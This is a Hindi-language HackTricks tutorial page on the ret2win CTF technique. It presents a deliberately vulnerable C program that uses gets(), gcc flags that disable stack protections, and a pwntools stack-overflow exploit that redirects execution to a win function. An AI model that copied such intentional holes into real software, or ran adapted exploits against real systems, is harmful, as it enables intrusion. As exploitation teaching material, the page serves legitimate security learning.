# Ret2win

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

**Ret2win** चुनौतियाँ **Capture The Flag (CTF)** प्रतियोगिताओं में एक लोकप्रिय श्रेणी हैं, विशेष रूप से उन कार्यों में जो **बाइनरी शोषण** से संबंधित हैं। लक्ष्य एक दिए गए बाइनरी में एक कमजोरियों का शोषण करना है ताकि बाइनरी के भीतर एक विशिष्ट, अनावृत्त फ़ंक्शन को निष्पादित किया जा सके, जिसे अक्सर `win`, `flag`, आदि जैसे नाम से जाना जाता है। जब इस फ़ंक्शन को निष्पादित किया जाता है, तो यह आमतौर पर एक ध्वज या सफलता संदेश प्रिंट करता है। चुनौती आमतौर पर स्टैक पर **रिटर्न पता** को ओवरराइट करने में शामिल होती है ताकि निष्पादन प्रवाह को इच्छित फ़ंक्शन की ओर मोड़ा जा सके। यहाँ एक अधिक विस्तृत व्याख्या है उदाहरणों के साथ:

### C Example

एक साधारण C प्रोग्राम पर विचार करें जिसमें एक कमजोरी और एक `win` फ़ंक्शन है जिसे हम कॉल करने का इरादा रखते हैं:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
इस प्रोग्राम को स्टैक सुरक्षा के बिना और **ASLR** को बंद करके संकलित करने के लिए, आप निम्नलिखित कमांड का उपयोग कर सकते हैं:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-m32`: प्रोग्राम को 32-बिट बाइनरी के रूप में संकलित करें (यह वैकल्पिक है लेकिन CTF चुनौतियों में सामान्य है)।
- `-fno-stack-protector`: स्टैक ओवरफ्लो के खिलाफ सुरक्षा को अक्षम करें।
- `-z execstack`: स्टैक पर कोड के निष्पादन की अनुमति दें।
- `-no-pie`: पोजीशन इंडिपेंडेंट एक्सीक्यूटेबल को अक्षम करें ताकि `win` फ़ंक्शन का पता न बदले।
- `-o vulnerable`: आउटपुट फ़ाइल का नाम `vulnerable` रखें।

### Python Exploit using Pwntools

हम एक्सप्लॉइट के लिए **pwntools** का उपयोग करेंगे, जो एक्सप्लॉइट लिखने के लिए एक शक्तिशाली CTF ढांचा है। एक्सप्लॉइट स्क्रिप्ट एक पेलोड बनाएगी जो बफर को ओवरफ्लो करेगा और रिटर्न पते को `win` फ़ंक्शन के पते से ओवरराइट करेगा।
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
`win` फ़ंक्शन का पता लगाने के लिए, आप **gdb**, **objdump**, या किसी अन्य उपकरण का उपयोग कर सकते हैं जो आपको बाइनरी फ़ाइलों का निरीक्षण करने की अनुमति देता है। उदाहरण के लिए, `objdump` के साथ, आप उपयोग कर सकते हैं:
```sh
objdump -d vulnerable | grep win
```
यह कमांड आपको `win` फ़ंक्शन का असेंबली दिखाएगा, जिसमें इसका प्रारंभिक पता शामिल है।

Python स्क्रिप्ट एक सावधानीपूर्वक तैयार किया गया संदेश भेजती है जो, जब `vulnerable_function` द्वारा संसाधित किया जाता है, तो बफर को ओवरफ्लो करता है और स्टैक पर रिटर्न पते को `win` के पते से ओवरराइट करता है। जब `vulnerable_function` लौटता है, तो यह `main` पर लौटने या बाहर निकलने के बजाय `win` पर कूदता है, और संदेश प्रिंट होता है।

## सुरक्षा

- [**PIE**](../common-binary-protections-and-bypasses/pie/index.html) **को बंद किया जाना चाहिए** ताकि पता निष्पादन के दौरान विश्वसनीय हो या जिस पते पर फ़ंक्शन संग्रहीत होगा वह हमेशा एक जैसा नहीं होगा और आपको यह पता लगाने के लिए कुछ लीक की आवश्यकता होगी कि `win` फ़ंक्शन कहाँ लोड हुआ है। कुछ मामलों में, जब ओवरफ्लो का कारण बनने वाला फ़ंक्शन `read` या समान होता है, तो आप रिटर्न पते को `win` फ़ंक्शन में बदलने के लिए 1 या 2 बाइट्स का **आंशिक ओवरराइट** कर सकते हैं। ASLR के काम करने के तरीके के कारण, अंतिम तीन हेक्स निबल यादृच्छिक नहीं होते हैं, इसलिए सही रिटर्न पता प्राप्त करने का **1/16 मौका** (1 निबल) होता है।
- [**स्टैक कैनरीज़**](../common-binary-protections-and-bypasses/stack-canaries/index.html) को भी बंद किया जाना चाहिए या समझौता किया गया EIP रिटर्न पता कभी नहीं होगा।

## अन्य उदाहरण और संदर्भ

- [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
- [https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html](https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html)
- 32bit, कोई ASLR नहीं
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html)
- 64 बिट्स के साथ ASLR, बिन पते का लीक
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html)
- 64 बिट्स, कोई ASLR नहीं
- [https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html)
- 32 बिट्स, कोई ASLR नहीं, डबल स्मॉल ओवरफ्लो, पहले स्टैक को ओवरफ्लो करना और दूसरे ओवरफ्लो के आकार को बढ़ाना
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32 बिट, relro, कोई कैनरी नहीं, nx, कोई pie नहीं, रिटर्न पते `fflush` को `win` फ़ंक्शन (ret2win) के साथ ओवरराइट करने के लिए फॉर्मेट स्ट्रिंग
- [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
- 64 बिट, relro, कोई कैनरी नहीं, nx, pie। `win` फ़ंक्शन (ret2win) को कॉल करने के लिए आंशिक ओवरराइट

{{#include ../../../banners/hacktricks-training.md}}
